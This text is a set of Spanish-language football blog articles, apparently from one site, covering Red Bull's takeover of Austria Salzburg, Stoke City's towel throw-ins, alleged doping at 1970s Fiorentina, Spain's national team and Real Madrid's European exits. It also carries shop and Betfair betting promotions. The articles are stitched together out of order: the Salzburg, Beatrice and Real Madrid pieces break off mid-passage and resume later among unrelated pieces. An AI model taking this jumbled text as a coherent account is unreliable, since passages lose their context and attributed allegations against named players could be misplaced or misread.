que cada vez pinta menos en todo este circo. Porque, llámenme tradicionalista, pero nadie entiende esa fijación obscena por cambiar lo que funciona y lo que ya ha ganado arraigo y poso con el paso de los años. La modernidad mal entendida lleva a menospreciar las tradiciones, a restar valor a lo que tenemos y añorar lo que no tenemos o no podemos ser. Si el fútbol de selecciones era casi como un último reducto intocable ajeno a los caprichosos designios comerciales de las marcas deportivas, Adidas acaba de derribar la empalizada y entrar a cuchillo allí donde debería haberse mostrado respetuosa, sensata y servil con el sentimiento del aficionado.Puedes comprar camisetas de México (negras, blancas y también verdes) en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Muchos años antes de que Dietrich Mateschitz, empresario multidisciplinar y alma máter de Red Bull, decidiese que el fútbol podría ser un magnífico escaparate para su compañía de bebida energética, el balón ya rodaba en Salzburgo. De hecho, Mateschitz no había nacido aún cuando, en 1933, los dos equipos de fútbol existentes desde principios del sigo XX en la ciudad alpina, Rapid Salzburg y Salzburg Hertha, decidieron unirse bajo un mismo escudo y unos mismos colores, el blanco y el violeta, para alumbrar al SV Austria Salzburg. Muy condicionado por el Anschluss de 1938, el Austria Salzburg no tuvo unos primeros años de vida precisamente sencillos. No consiguió debutar en la máxima categoría austriaca hasta la temporada 1953/54, convirtiéndose en un equipo ascensor durante las décadas de los años cincuenta y sesenta, permaneciendo muy alejado del potencial de los grandes equipos de la capital del país. Tuvieron que llegar los años setenta para que el principal equipo de Salzburgo viese como su historia, triste historia hasta la fecha, daba un giro radical para colocar a la entidad alpina en una trayectoria ascendente que, salvo un breve lapso a mediados de los años ochenta durante el que el club volvió a perder la categoría, no se ha visto alterada hasta nuestros días.Pero la historia del principal club de fútbol de la ciudad de Salzburgo está marcada, en su era más actual, por una circunstancia muy particular. En apenas cuatro décadas, el equipo ha tenido hasta cuatro denominaciones diferentes, algo que no resulta infrecuente en una Bundesliga austriaca tradicionalmente muy explotada comercialmente y que acostumbra a ver cómo algunos de sus participantes adoptan en su denominación la marca comercial de su patrocinador, sin mayores limitaciones que el buen gusto y el respeto a la tradición del club en cuestión.En Salzburgo primero fue la empresa del sector del juego Casinos Austria. Corría el año 1978, con el equipo recién ascendido a la Bundesliga austriaca, cuando el SV Austria Salzburg cambió su denominación oficial por la de Casino Salzburg. Bajo esa histórica denominación, el club alcanzó algunas de sus hazañas más recordadas. Fue finalista de la UEFA de 1994, cayendo en la final ante el Inter por un gol a cero, y conquistó los primeros títulos de su historia, alzándose con los campeonatos ligueros 93/94, 94/95 y 96/97. Más tarde, en la 97/98, el club vio como la denominación de Casino desaparecía de su nombre oficial para dejar su lugar a la de Wüstenrot Salzburg, gracias al acuerdo de patrocinio alcanzado con Wüstenrot-Gruppe, compañía dedicada a los servicios financieros y los seguros.Sin embargo, ninguno de aquellos dos cambios de denominación tuvo un significado tan profundo o tan polémico como el que se produjo en el año 2005, cuando a Dietrich Mateschitz se le ocurrió que el fútbol pasaba a ser una opción preferencial en su estrategia comercial de product placement deportivo para su marca de bebidas energéticas. Red Bull adquirió el histórico club alpino y no se limitó a ser un simple patrocinador como en su día lo fueron Casinos Austria o Wüstenrot-Gruppe. Quizá por ello, adoptó una serie de decisiones que supusieron un antes y un después con respecto a la relación de la hinchada con el club.En primer lugar, Red Bull, nuevo propietario del club, decidió no reconocer los más de setenta años de historia de la entidad que acababa de adquirir. Se eliminó cualquier rastro del pasado, títulos y hazañas incluidos (aunque finalmente estos acabaron siendo incluidos de muy discreta manera en su web oficial), se cambió la denominación del club (Red Bull Salzburg), se enterraron los tradicionales colores blanco y violeta en detrimento de los colores de la empresa e incluso se diseñó un nuevo escudo, que no era sino el logo comercial del nuevo propietario. Sólo el chapucero añadido de una pelota de fútbol entre los dos habituales toros rojos permitía al aficionado distinguir aquel escudo como el de su histórico club. Como era de esperar, tal revolución no cayó nada bien entre la afición de Salzburgo. ‘El Red Bull no puede ser violeta, si lo fuera no podríamos seguir llamándolo toro rojo‘, se excusaba Mateschitz ante la avalancha de quejas de los seguidores del equipo. De pronto, el asunto cromático pasó a ser de capital importancia. Apenas habían pasado unas semanas desde la adquisición del club por Red Bull cuando varios seguidores del Salzburg que portaban emblemas en los tradicionales colores blanco y violeta fueron expulsados de un amistoso de pretemporada por considerarlos ‘inapropiados’.Que luego ya veríamos. Poca cosa que Tosi ha considerado ofensiva hasta el punto de verse obligado a decir la suya.A este tipo de personajes hay que recordarles un par de cosas. Insultar a la gente por el color de la piel no es de recibo incluso si el agraviado es un antipático de manual. La otra es que su intento de disfrazar un problema evidente que aqueja al fútbol italiano (ahí está la enésima payasada de los ultras de la Lazio hace unos días) con excusas peregrinas y análisis frívolos resulta patético e inadmisible.Está a punto de regresar la liga italiana con mejor pinta de los últimos años. Con fichajes despampanantes como Tévez, Higuaín o Mario Gómez. Con la gran Juventus, el pujante Nápoles o el fútbol atractivo de la Fiorentina… Ahí está Prandelli llevando a la selección por el camino recto. Efectivamente, es el año del regreso a la máxima categoría de un equipo con tanto sabor e historia como el Verona. Y parecía un buen día, hasta que vino alguien a joderlo. Si el Arsenal es ornamento pop y el City vértigo punk, lo del Stoke es el garage más chatarrero que te puedas echar a la cara. Fuzz, ruido, saturación y reverb. Cucharadas soperas de raca raca es lo que administra Tony Pulis a la parroquia del Britannia cada domingo. Cantidad antes que calidad, el Stoke City es el Billy Childish de la Premier League, abarrotando contenedores con rock primitivo grabado en cintas TDK. Campo tan pequeño como te permita la norma, alto voltaje en cada entrada, balones al hombre alto y ahora camisetas con el reverso de toalla para secar la pelota y poder aventarla como dios manda en cada saque de banda. Y la cosa seguirá funcionando salvo que la FA decida lo contrario.El Stoke se marcó la machada el otro día derrotando al Tottenham (2-1) pero las cámaras de televisión captaron algo más jugoso que el enésimo revolcón del rico contra el pobre. Anomalía deliciosa, se vio a Ryan Shotton secando con profusión la pelota antes de sacar de banda con lo que parecía ser una extraña toalla alojada bajo la camiseta rojiblanca. La artimaña, que no deja de ser el complemento lógico para los famosos saques estilo Delap, causó estragos en la defensa spur pero como aun no está claro si vulnera el reglamento, la FA ha decidido sacar la lupa a pasear para determinarlo. Vaya a ser que una idea inteligente manche el buen nombre del fútbol inglés…“Es un chaleco de felpa del mismo color que la camiseta. La norma dice que no hay problema siempre y cuando la ropa interior sea del mismo color que el color predominante de la camiseta. No dice nada del material con el que esta haya sido fabricada”, declaró un portavoz oficial del club cuando el revuelo se hizo público. No es la primera vez que le afean la conducta al Stoke. Neil Warnock, míster del QPR, advirtió como los recogepelotas del rival secaban cada pelota que se perdía más allña de la línea de banda y exigió el mismo trato como visitante consciente de que el balón parado con la mano es letal en casa del Stoke.El mismo Arsene Wenger, que no es sospechoso de emocionarse con el kick and rush, declaró hace un par de años que el Stoke se limitaba a usar una fortaleza que no era común en el fútbol. Yo firmo debajo de lo que dice el técnico francés y espero que la FA no sancione lo que simplemente es un excelente ejercicio de inteligencia. Cada semana, y de la mano de Betfair.com, os ofreceremos  los partidos más interesantes del fútbol mundial, con especial atención a  todos aquellos que os manejáis en el mundo de las apuestas on-line. El domingo se juega la final del Mundial y estamos sin estar en nosotros. Como la famosa santa alucinada. Azotada, flagelada durante generaciones, ocurre que la selección y nosotros, sus fieles, vivimos en éxtasis desde la conquista de la Eurocopa y hemos decidido levitar hasta posarnos al lado del trofeo dorado en la gran final. Con el saco preparado para embolsarnos esos preciados quilates, que no todo va a ser misticismo. Enfrente tendremos una Holanda terrena y outsider. En la oranje veo un grupo de carácter blindado que ha sabido patear los estigmas de un pasado glorioso y la desconfianza general en su desempeño a base de un juego aseado para situarse en disposición de besar la gloria. Con todo merecimiento, ojo. Será el once de julio en el monumental de Johannesburgo y la tensión, huelga decirlo, se podría cortar en lonchas como un salchichón. Bendita tensión.Si la metáfora se pudiese trasladar a la realidad comprobaríamos que el sujeto España llega a la final habiendo crecido al menos un palmo desde el desastre inaugural, tal parece que la derrota ante Suiza fue un manguerazo de agua helada en la cara del resacoso, y además llega crecido moralmente, que  son dos cosas muy diferentes pero muy buenas noticias ambas. Y al contrario que esa mayoría que se empeña en sofocar los rescoldos de la emoción, seguramente a imitación del carácter sereno de nuestro seleccionador, yo creo que la euforia debe ser precisamente el combustible que nos empuje al éxito. Dejamos atrás hace tiempo la españolísima querencia autodestructiva sobre todo aquello que ocurría en el césped y de nuevo como en la Eurocopa, hemos pisado el pedal hasta el fondo y hasta el final. La ocasión lo merece y no tengo ninguna duda de que el equipo no va a aflojar en el último envite.Hacer las previas de España es fácil. Más allá de algún pequeño cambio de cromos, a estas alturas de la película no hay motivos para dudar de que la intención del equipo va a ser controlar el partido con el balón en los pies. Realmente es lo único importante y contra Holanda no será diferente. España ha encontrado un modelo operativo eficiente en la circulación que ofrece un grupo de centrocampistas excepcional. Con Xavi como eje primario del engranaje, se buscan soluciones a los problemas a través de la maestría de Iniesta y las meninges de Alonso y Busquets. Cada uno aporta valor al producto final pero todos están cortados por el patrón del buen pie y la inteligencia. Y si se rompe una pieza los recambios, Pedro en la memoria de todos ante Alemania, son de primera calidad. Al motor hay que sumar unos cimientos sólidos, Piqué como viga maestra, y el delantero letal que tenemos en la figura de David Villa. Un once magnífico al que tan sólo se le puede achacar su escaso rendimiento goleador.Prestos para robarnos el caramelo está Holanda, el campeón que nunca fue. Apartando a manotazos los nubarrones agoreros y el lastre de un pasado glorioso, la escuadra que dirige Bert van Marwijk han llegado a las puertas de su tercera final capeando las olas tímidas de un grupo asequible y surfeando la ola brasileña con asombrosa efectividad. Con el buen pie por bandera, hay cosas que nunca cambian, los holandeses han incorporado la táctica al repertorio para ensamblar un producto de alta calidad. La buena presión de sus delanteros, una de las vanguardias que más faltas comete, y la sensibilidad para acelerar o ralentizar el ritmo del partido a su antojo son sus armas. Y lírica aparte la calidad inacabable de sus dos puntales: Arjen Robben, un jugador irresistible en sus mejores tardes, y Wesley Sneijder, quizá el centrocampista más influyente en los marcadores de todo el torneo. Un señor equipo Holanda, quizá con la defensa, sobre todo en el juego corto que borda España, como punto débil.España, acostumbrada en los últimos tiempos a patear estigmas, tiene todo para levantar el trofeo. Aparcado el debate inane, dobles pivotes y los cromos del banquillo en las pesadillas de medio país, la selección dio ante el mejor equipo del torneo, Alemania, un do de pecho propio de campeones.De la batalla más fiera salió reforzada. El martillazo eléctrico de Puyol nos ha puesto en una órbita que no debemos, no podemos abandonar. Han sido muchas decepciones, mucho quiero y no puedo, demasiado infrafútbol. Queremos que llegue ya el domingo. El 11 de julio las almas de todo el país, en sobrenatural cortejo, flotarán sobre el Soccer City de Johannesburgo 11 para asistir a la primera final  mundialista de nuestra historia. Juro que jamás creí que podría escribir estas palabras, para ser campeones del Mundo.España es favorita y su victoria se paga a 2,18 euros por euro  apostado en Betfair.com. En  cambio, el triunfo oranje se cotiza a 3,85 y el empate a 3,45 por euro. Por mucho Batistuta y Rui Costa que resuene en la cabeza de los aficionados de mi generación la Fiorentina nunca ha tenido mejores equipos que los que construyó en los años setenta y sesenta. Basta observar las fechas grabadas en los trofeos que reposan en las vitrinas del Franchi para entenderlo. Una de las dos ligas ganadas por la entidad viola (la 68-69) y tres Copas incluida la del 74, con el gran Antognoni y Nereo Rocco al mando, duermen en esas estanterías. Aquella Fiore volaba y sus éxitos son un orgullo para Florencia, todos en la ciudad los recuerdan con cariño. Todos menos Ugo Ferrante, defensa subcampeón del Mundo en México que murió en 2004 por un cáncer de garganta; Adriano Lombardi, que fue juvenil viola y murió en 2007 tras una larga esclerosis; Nello Saltutti, buen goleador al que un infarto se lo llevó con 56 primaveras o Giuseppe Longoni, aquejado del corazón hasta el punto de vivir sus últimos años postrado en una silla de ruedas. Otras piezas notables de aquellos tiempos tuvieron mejor suerte. Antognoni volvió a la vida a los 55 tras un infarto, el portero Mattolini ha superado un transplante de riñón y Mimmo Caso un cancer de hígado.Hace un par de años se intentó investigar el asunto del dopaje pretérito en Italia con el caso Fiorentina en el foco. Fue a  raíz de la muerte de Bruno Beatrice. El Mastín, así le llamaban por su poderío en el centro del campo, fue jugador de la Fiorentina en la  década de los 70 y murió de leucemia en 1987 a la pronta edad de 39  años. Hasta aquí todo normal. El problema es que tras Bruno fueron cayendo unos cuantos más compañeros de camiseta. Su mujer sospechó y  denunció que el fallecimiento de su esposo estuvo provocado por el  exhaustivo tratamiento de Rayos X al que le había sometidoel cuerpo médico de la Fiore  para curarle una lesión de pubalgia. A eso y a las sustancias  anabolizantes con las que los galenos florentinos atiborraban a la plantilla. “Estoy segura de que Bruno y los otros jugadores de la  Fiorentina murieron o enfermaron porque se doparon o porque fueron  tratados con terapias criminales”, afirma Gabrielle Beatrice, viuda del futbolista.Lo que cuenta la buena señora en varias entrevistas es impactante. Recuerda, por ejemplo, como los médicos le aplicaron tratamiento diario de electroterapia durante tres meses para tratar de solucionar una simple pubalgia o como le inyectaban sistemáticamente medicinas (entonces legales aunque todo el mundo en la profesión supiera lo dañinas que resultaban para la salud) para recuperarse más facilmente del cansancio y estimulantes antes de los partidos importantes. A este respecto cuenta algo sorprendente. Un buen día descubrió tres puntos morados, sospechosos,  marcados en el brazo de su esposo. Las marcas no no se iban ni al frotarlas con jabón. Más tarde Bruno le comtó que era hí donde le pinchaban.Hasta tal punto llegaron las consecuencias del escaso calado de los nuevos colores de la entidad, que el propio club se vio en la tesitura de tener que regalar una camiseta del equipo a cada abonado, con el único fin de que el rojo y el blanco fuesen ganando sitio en el graderío al reivindicativo violeta.El Red Bull Salzburg, que desde que cambiase de denominación ha conseguido convertirse en el firme dominador de la Bundesliga austriaca alzándose con cuatro títulos en ocho temporadas, sigue sin calar entre los aficionados del primigenio SV Austria Salzburg. Simplemente, y pese a contar con la fuerza de un importantísimo apoyo económico hasta la fecha desconocido para ellos, no ven el club como suyo, no se identifican con él. Cuentan con uno de los estadios más imponentes de Austria, cómo no, Red Bull Arena, con capacidad para más de treinta mil espectadores, pero rara vez llega a ocuparse más de un 50% del aforo total. Con todo, son muchos más de los que acuden cada dos semanas a animar al SV Austria Salzburg refundado, con su nombre, colores y escudo tradicionales, por un grupo de aficionados que no se resignaban a ver morir al club de su corazón bajo los millones de Red Bull. En apenas ocho años de existencia han conseguido ascender tres categorías en la escala del fútbol austriaco. Aún les quedan dos peldaños más, los dos más complicados, para poder medirse a su verdugo, pero prometen seguir dando guerra. Aunque sea por puro orgullo.Puedes comprar camisetas del Salzburg y de cientos de clubes más en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. He arrancado a escribir estas líneas al menos cuatro o cinco veces. En un primer lugar, quise centrarme en lo que a día de hoy me parece uno de los principales problemas de la selección y titulé algo así como ‘¿Qué hacemos con el nueve? ‘. Desestimada la idea inicial, centré mis esfuerzos en concretar algo sobre la tumultuosa regeneración del combinado nacional, aquella que debió de acometerse tras el éxito de la Euro 2012 y que, por unas causas o por otras, se fue posponiendo hasta que fue demasiado tarde y el proceso se había ido ya de las manos de sus responsables. Y nada me convencía porque todo me parecía quedarse muy corto sobre el esperpento en el que se ha convertido España.Me cuesta identificar los males que aquejan a la selección. Más allá de lo complicado de asumir la ausencia de futbolistas que, en sus mejores momentos, fueron referencias mundiales en sus posiciones (hablo de Xavi y Xabi, de Iniesta, de Villa o de Casillas, por ejemplo) y de que la España del período 2008-12 es un equipo irrepetible, es difícil imaginar qué es lo que ha podido suceder para que el combinado nacional no haya pasado por un aceptable término medio, pasando del todo a la nada, del éxito a la decadencia absoluta. Quizá quienes deberían de haber asumido el mandato de forma natural, quienes estaban llamados a cubrir el hueco dejado por los ausentes, no hayan sabido gestionar la responsabilidad. Hablamos, tal vez, de una suerte de generación perdida. De los Cazorla, Silva, Albiol, Pedro, Fàbregas. Y de otros (Mata, Llorente, Navas, Negredo) que, directamente, desaparecieron de la órbita de la selección. Eternos aspirantes, perennes ocupantes de papeles secundarios y de reparto, acostumbrados a vivir siempre bajo la cómoda sombra y el cobijo de quienes estaban obligados a asumir responsabilidades en la época gloriosa.Subyace además una cierta sensación de que vestir la camiseta de la selección nacional ha dejado de ser un privilegio. De que aquellos que tienen la fortuna de ser seleccionados no forman parte de ninguna casta especialísima ni de ninguna estirpe legendaria. Jugar hoy con España resulta significativamente barato, como muestran ciertas convocatorias recientes. O tal vez sea que lo que va surgiendo desde abajo ya no ilusiona tanto y hay que tirar de futbolistas de segundo nivel para completar las listas y ver, de paso, si suena la flauta por casualidad. Además, a los recién llegados se les carga de una presión desorbitada porque directamente se les cuelgan unos galones que aún no están capacitados para lucir. Es algo que choca frontalmente con el habitual inmovilismo al que nos tenía (y, con ciertos casos, aún nos tiene) acostumbrados Vicente del Bosque, técnico de claro carácter conservador en el manejo de sus vestuarios. Presencias como la de Albiol (¿cuántos partidos del Nápoles habrá seguido el cuerpo técnico de la selección en esta temporada?) o la de Pedro, muy lejos ambos de sus respectivos mejores momentos, se sujetan difícilmente y solo se explican bajo la perspectiva del que prefiere no agitar demasiado el agua para no enfangar el estanque.Se ven muy lejanos los tiempos en los que la afición se llevaba las manos a la cabeza por jugar con un doble pivote (¿se alcanza ahora a comprender la trascendencia de aquel Alonso-Busquets?) o por confiar la responsabilidad goleadora en el invento del falso nueve. Hoy son detalles, simples variantes tácticas que serían vistas con muy buenos ojos si contribuyeran a sacar a los nuestros de ese tono gris oscuro en el que parecen haberse instalado desde los tensos días de Curitiba.Desde que Adidas decidió, con la connivencia de la RFEF, que España debía de vestir de negro en su uniforme visitante, el panorama deportivo no ha podido ser más desolador. Así como al color dorado se le relacionará siempre con el despertar de la mejor España de la Historia, el negro será siempre relacionado con la debacle de Brasil 2014 y la dificultosa regeneración de un equipo legendario. En Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo, puedes encontrarla, antes de que sea demasiado tarde, en liquidación. La cantera del Real Madrid es un magnífico generador de noticias.No sé realmente qué valor deportivo puede llegar a tener en un club con un nivel de exigencia diaria como el madridista, pero de lo que no cabe ninguna duda es de que siempre es objeto del más intenso debate. Muy frecuentemente, La Fábrica (qué tendrá el nombrecito, que no termina de calar…) es empleada incluso como arma arrojadiza entre facciones enfrentadas dentro del propio club.Ocurre sin embargo de cuando en cuando, que esa inmensa centrifugadora de jóvenes talentos llegados desde cualquier rincón de España (y últimamente cada vez más del resto del planeta) que es la factoría de Valdebebas escupe algún pipiolo en dirección a la primera plantilla. El chico, de entrada, suele aterrizar como un pajarillo caído del nido, entre asustado y sobrepasado, casi con miedo a abrir la boca y decir alguna inconveniencia no deseada. La batería mediática, que no mira carnets de identidad a la hora de rellenar páginas o minutos, se encarga de desvirgar al nene. Un par de páginas por aquí, quién sabe si tal vez alguna portadita por allá, y el joven canterano ya está dispuesto y preparado para afrontar el salto al primer equipo. Como si de golpe hubiese crecido cinco años.Supe de Jesé Rodríguez (Las Palmas de Gran Canaria, 1993) hace alrededor de tres años por un artículo, para mayor gloria de su aún muy incipiente e incierta figura, en el diario Marca. Al jovencísimo delantero canario, por aquel entonces aún en edad juvenil, se le comparaba ni más ni menos que con Cristiano Ronaldo. Así, sin anestesia. El artículo en cuestión parecía formar parte de una campaña de imagen. Como una especie de publi-reportaje, destacaba sus innumerables virtudes, recogía elogios de compañeros y técnicos y disparaba, en definitiva, las expectativas sobre el chaval.Por eso, y por el habitual ruido mediático del Castilla (con más minutos de televisión que gran parte de los equipos de Primera división), Jesé se ha asentado en el Bernabéu con la mili hecha y las suelas de las botas desgastadas en innumerables noches de imaginaria. Sabía, al menos, de qué iba el asunto. No vamos a descubrir ahora sus condiciones futbolísticas. Tampoco vamos a incidir especialmente en masticadísimos lugares comunes a cualquier canterano blanco como el desparpajo, la ilusión y demás retahíla de epítetos. El canario es uno de esos futbolistas de los que Camacho decía que no llaman tímidamente a la puerta del primer equipo y piden permiso para pasar, sino que la tiran abajo de una patada. Jesé se ha desgañitado durante estos tres últimos años frente a los nobles portones del Bernabéu. Harto de que no le abriese nadie la puerta, decidió entrar sin preguntar, colarse en el salón y acomodarse en el sofá con los pies sobre la mesa. Y tal vez sea esa la mejor tarjeta de presentación para lograr pasar el filtro y hacer historia en Chamartín. Nuestros amigos de Classic Football Shirts continuan con su política de crecimiento y expansión a través de Internet. Esta vez le toca el turno a su canal de Youtube, que ha sido presentado esta misma semana y que servirá de plataforma idónea para una nueva ‘sección’. La serie ‘Shirt of the day‘ pretende acercarnos un poco más a aquellas camisetas especiales, históricas o con una historia peculiar detrás que van llegando al almacén de Manchester.Para celebrar el lanzamiento del canal, Classic Football Shirts ofrece un 20% de descuento en todos sus productos, con fecha límite para realizar tu pedido hasta el viernes día 17 a medianoche. No esperes más y aprovecha. (Necesitas ver el vídeo de presentación del canal para hacerte con el código del Cupón de descuento). Manchester United 1994/96 Juventus Centenary VisitanteParma Centenary Special EditionLiverpool 1989/91México Copa América 2015 Tras tres títulos en seis años, el madridismo pensaba que todo el monte era orégano. Que no habría equipo, por poderoso que fuese, que pudiera descabalgar al Madrid de aquella imparable ola que parecía haber cogido allá por el año 98. Y apareció una vieja conocida para recordar que Europa no era un parque infantil. Que en el viejo Delle Alpi las venganzas eran parte del acervo popular. Tras un prometedor 2-1 en la ida del Bernabéu (goles de Roberto Carlos y Ronaldo), la Juventus de Trezeguet, Del Piero y Nedvěd (que se perdería la posterior final por acumulación de amarillas) machacaba sin piedad los sueños madridistas de acercarse a la Décima. Perderían la final ante el Milan, en los penalties. La primera de Ancelotti.Morientes. La eliminación madridista de la temporada 03/04 lleva el nombre propio del exdelantero blanco, entonces vistiendo la camiseta del Mónaco, posterior finalista del torneo. Un gol del de Sonseca en el Bernabéu, donde fue sonora e inocentemente ovacionado, y otro más en el Principado comenzaron a cimentar la oscura maldición del décimo título.La temporada 04/05 abría una etapa muy negra en la historia reciente del madridismo en el continente, la de los seis años consecutivos cayendo en la eliminatoria de octavos de final. La primera fue de nuevo una pesadilla recurrente vestida de negro y blanco. Un imprevisible gol del uruguayo Zalayeta en el minuto 116 del partido para matar la historia.Thierry Henry cabalgando desatado por la banda del Bernabéu. Un equipo que parecía un rival menor creciéndose ante un escenario impactante. La vieja y angosta ratonera de Highbury hizo el resto. Sobre el reducido tapete de Islington el Madrid de Ronaldo, Raúl, Beckham, Roberto Carlos y Zidane se ahogaba impotente bajo la emboscada gunner. El mejor ataque del mundo sucumbiendo a un truco muy viejo.Un espectacular partido en la ida en el Bernabéu, de esos que se recuerdan durante años, permitió al Bayern salir vivo de Madrid gracias a un gol de van Bommel cuando el árbitro ya miraba su reloj. El gol más rápido de la historia de la Champions en la vuelta terminó de voltear la situación. Roberto Carlos dormido en los laureles y Roy Makaay sorprendiendo a toda Europa. El Bayern, otra vez. ¿Quién podía imaginarse a la Roma eliminando al Madrid, una vez más en octavos? Probablemente ni el propio Spalletti. La guerra abierta en el Madrid de Schuster facilitó la tarea a un equipo valiente y decidido que se vio con fuerza de ir a por la eliminatoria ante la inoperancia blanca en el Bernabéu en el partido de vuelta. El 2-1 de Italia dio alas a los romanistas, que con un gol de Rodrigo Taddei lo pusieron todo patas arriba. Maquilló, en un intento de épica, Raúl, pero Vučinić destrozó esperanzas ya en el descuento. 1-2 en Madrid.El gran año del chorreo. O lo que es lo mismo, del ridículo sobre el césped de Anfield. Eran años complicados en el Bernabéu, años de cambios traumáticos, de presidencias hilarantes y lenguaraces. Vicente Boluda, que había heredado el trono del caído Calderón, cometió la gravísima y torpe imprudencia de menospreciar al Liverpool. La historia de Anfield (4-0 en la vuelta) supuso un punto de inflexión radical.Temporada 09/10. Aparece en escena un equipo que acabará convirtiéndose en un asiduo del Bernabéu. El Olympique de Lyon, que ya reinaba en Francia, sorprende al madridismo con un fútbol sólido y práctico. Sin artificios pero tremendamente efectivo.Los puntos morados acompañaron a Bruno Beatrice incluso durante los 30 largos meses de penuria que tuvo que soportar hasta encontrar la tumba.Saco el caso a colación la historia de Bruno Beatrice tras los datos que  Jean-Pierre Paclet, ex médico  de la selección nacional francesa, ha  revelado en su reciente libro  “L’Implosion”. “Los análisis de sangre  revelaron anomalías en varios bleus justo  antes del Mundial de 1998. Se podían tener grandes  sospechas cuando se  sabía los clubes en los que jugaban algunos  jugadores, especialmente en  los del campeonato de Italia”, afirma el  galeno. Paclet, médico  de la francesa durante el Mundial 2006,  jura y  perjura que si se  hubieran hecho análisis en el 98 con el debido rigor,  a más de alguno se  le habría caído el pelo. Y aquí involucra directamente  a dos leyendas: Zinedine Zidane y Didier Deschamps, por entonces   trabajadores de la Juventus de Turín. Según el doctor, era sabido por   todos en la profesión que la Juve ganaba a base de algo más que sano   entrenamiento y disciplina defensiva.Nada más lejos de mi intención que volcar basura gratuitamente sobre el mundo del fútbol pero el   tratamiento que recibe nuestro deporte preferido en temas de dopaje respecto a otros, lease ciclismo o atletismo, beneficia enormemente la duda. Imaginen que ocurriría si nos comenzamos a levantar cada semana con la muerte de algún campeón del Tour de Francia. Bien, en Italia ha ocurrido. Aquí ha habido casos sonados, aun sin víctimas es cierto, pero el show continúa. Debe continuar.Edito: completo el artículo con el vídeo que me sugiere dagtp en el hilo de comentarios. Muchas gracias. “Solamente Becali y el PNG traerán la luz. Vamos a hacer una revolución espiritual en Rumanía“La sección dominical del periodista David Hills en The Guardian es un caramelo para los amantes del fútbol de derribo. Presidentes corruptos, jugadores chaqueteros, salidas de tono intolerables, la FIFA… Todos fueron invitados a la mesa de Said and Done y en lugar de vino llevaron morralla. En la sartenada semanal de casquería futbolística mi highlight favorito siempre es la despreocupada querencia de George Becali, el dueño del Steaua de Bucarest, por quebrantar cualquier norma establecida. Da para un libro.Político populachero, empresario del fútbol, mafioso, iluminado, cromo violento, azote de homosexuales y de cualquier grupo étnico que no sea el suyo, promotor inmobiliario… según a quien preguntes Becali es uno u otro.Los partidos de preparación ante Italia y Rumania han sido propios de equipos indolentes, sin compromiso, hastiados.Tras el subidón de los títulos llegó la bajona de Brasil y ahora estamos recuperándonos poquito a poco. Tumbados en el sofá con las hechuras de un extraterrestre en la autopsia del Área 51. La resaca del DYC y del Larios, en el pecado está la penitencia. El día 13 de junio a las cuatro de la tarde nos espera la República Checa en Toulouse. Salvo locura, entiendo que el once debe ser De Gea, Alba, Piqué, Ramos, Juanfran, Busquets, Koke, Isco, Iniesta, Silva y Morata. No digo que sea el mío, digo que por lógica de la temporada debería estar por ahí la apuesta de Del Bosque.España ha perdido velocidad en la creación. Los de arriba no se asocian igual. Se sigue llorando más a Villa que a Chanquete. Sin los goles del asturiano, el área rival es un cenagal. Ramos no está en su mejor momento. La presencia amenazante de Casillas -¿imagináis que juega? - es un disparate viendo el estado actual del guardameta madrileño. Sobre Busquets, lo más fiable del actual combinado nacional, debería cimentarse el equipo. Eso y esperar a jugadores como Thiago o Nolito, dos futbolistas que son diferenciales, especiales y necesarios.Es cierto que el equipo despierta antipatía. Cierto despecho. La espina del pasado Mundial aún duele en la palma de la mano. Bien clavada, profunda y enrojecida. Al menos no estarán los Países Bajos, que es una venganza que dios nos ha dado y hay que recibir con entusiasmo. Cuando ruede el balón en Francia nos sacudiremos las rencillas y apoyaremos al equipo sin fisuras, pero ahora, como espectadores escépticos, la sensación es que España no sabe a qué juega, no encuentra los espacios del rival, no encuentra equilibrio en la delantera, no domina ni duerme los partidos como antaño y se mueve –como los juncos- al ritmo que el aire marca. Me gusta escribir del Madrid porque diga lo que diga voy a resultar tendencioso. Es tal el estado de paranoia en torno al equipo blanco que todo lo dicho sobre el club es juzgado, catalogado y puesto en cuestión por la afición y la contra-afición. Cierto que las intrigas palaciegas aburren, que hay personajes siniestros y una leve demonización de los dirigentes y técnicos; pero más allá de toda esta pátina a lo Borgia, el Madrid es un equipo de fútbol y, en esta temporada, del bueno. La figura de Mourinho como entrenador está ensombrecida por la figura de Mourinho como orador. Su prepotencia, altanería y cinismo desconciertan a los aficionados y cabrea a los contra-aficionados. Como estratega es de los buenos, sus equipos apuestan por un fútbol moderno, equilibrado, ofensivo en las grandes ocasiones y cicatero en los partidos difíciles. Es un ganador en el sentido estricto de la palabra: deja poco espacio al espectáculo si este puede perturbar una victoria. Pragmatismo podemos llamarlo o simplemente conservadurismo. Todo depende de vuestro gusto balompédico, del disfrute de cada uno. Yo soy un hombre vulgar y a mí lo que me gusta es celebrar los títulos.La desidia blanca y la aparente falta de gobierno de Pellegrini sobre el vestuario harían el resto. 1-1 en la vuelta del Bernabéu para hacer las maletas.Año I de la era Mourinho. El Madrid es, indudablemente, otro equipo. Ya no sucumbe en Europa ante equipos considerablemente inferiores como en años pasados. Esta vez va pasando rondas (Lyon, Tottenham)… hasta toparse con el perfeccionado Barça de Guardiola en la semifinal. Dos goles de Messi en la ida del Bernabéu (0-2) ponen la eliminatoria patas arriba. Nadie confía para la vuelta en Barcelona. Un partido muy cómodo para los azulgrana en la vuelta termina dejando a los madridistas en la primera de las tres semifinales de Mourinho.El penalti de Sergio Ramos en el Bernabéu. Una eliminatoria maldita y de nuevo apeados por el Bayern, pese a que todo se puso bonito cuando Ronaldo ponía el 2-0 en la vuelta en el minuto 15 del partido, para voltear el 2-1 para los alemanes firmado en Múnich. La historia, como vimos, terminaría sirviendo al defensor blanco su merecida revancha ante Manuel Neuer.La espectacular eliminatoria de semifinal ante el Borussia de Klopp. La exhibición de Robert Lewandowski, cuatro goles cuatro, en Dortmund y la angustia de la vuelta sobre el césped del Paseo de la Castellana. Un solo gol deja esta vez al madridismo con la miel en los labios. La tercera, y última, semifinal de José Mourinho. Para él, ‘un éxito‘. Nadie, ni los más optimistas del lugar, auguraban una exhibición blanca como la del pasado martes en el Allianz. El 0-4 supone un golpe sobre la mesa y una demostración de poderío que se escapa del alcance de cualquier equipo europeo del momento. Nadie duda ya, de que el espectacular partido de los de Ancelotti en Múnich pasará a la historia del madridismo con todo merecimiento. Espera Lisboa. Espera el Atleti.Puedes comprar camisetas del Real Madrid, desde los años ochenta hasta la actualidad, en Classic Football Shirts, la tienda 